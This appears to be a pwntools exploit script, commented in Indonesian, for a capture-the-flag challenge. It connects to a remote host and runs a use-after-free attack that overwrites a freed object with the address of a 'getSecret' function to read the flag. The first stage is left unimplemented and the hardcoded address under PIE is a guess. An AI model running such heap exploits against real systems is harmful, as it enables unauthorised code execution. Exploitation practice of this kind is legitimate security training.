from pwn import *

# --- Konfigurasi Remote ---
HOST = '94.237.61.202' # Contoh IP dari log lo
PORT = 49394           # Contoh Port dari log lo

# Alamat getSecret yang kita temuin
# Karena PIE aktif, alamat ini biasanya punya offset tetap
# Di tantangan ini, alamatnya: 0x555555555269
FUNC_GET_SECRET = 0x555555555269 

def start():
    return remote(HOST, PORT)

io = start()

# --- Tahap 1: Trigger Dropper (Tic-Tac-Toe) ---
# Di sini lo harus masukin move yang memicu execute_c2.
# Karena tadi di GDB lo paksa pake set $rip, 
# lo harus cari tahu move apa yang bikin dia masuk ke sana.
# Anggap saja ada move rahasia atau kita pakai buffer overflow.

# --- Tahap 2: Eksploitasi UAF (C2 Executable) ---
def exploit_c2():
    log.info("Memulai eksploitasi UAF pada C2_executable...")
    
    # 1. Create Agent (Menu C)
    io.sendlineafter(b'>', b'C')
    io.sendlineafter(b'username:', b'pwned')
    
    # 2. Free Agent (Menu E)
    io.sendlineafter(b'>', b'E')
    io.sendlineafter(b'(Y/N)?', b'y')
    log.success("Agent berhasil di-free!")
    
    # 3. Malloc & Overwrite (Menu F)
    # Kita kirim alamat getSecret dalam format byte (little endian)
    io.sendlineafter(b'>', b'F')
    log.info(f"Mengirim payload: {hex(FUNC_GET_SECRET)}")
    io.sendafter(b'go?', p64(FUNC_GET_SECRET))
    
    # 4. Trigger Execution
    # Panggil lagi menu F atau menu lain yang trigger executeAction
    io.sendlineafter(b'>', b'F')
    
    # Masuk ke mode interaktif buat baca Flag
    io.interactive()

# Jalankan eksploit
exploit_c2()
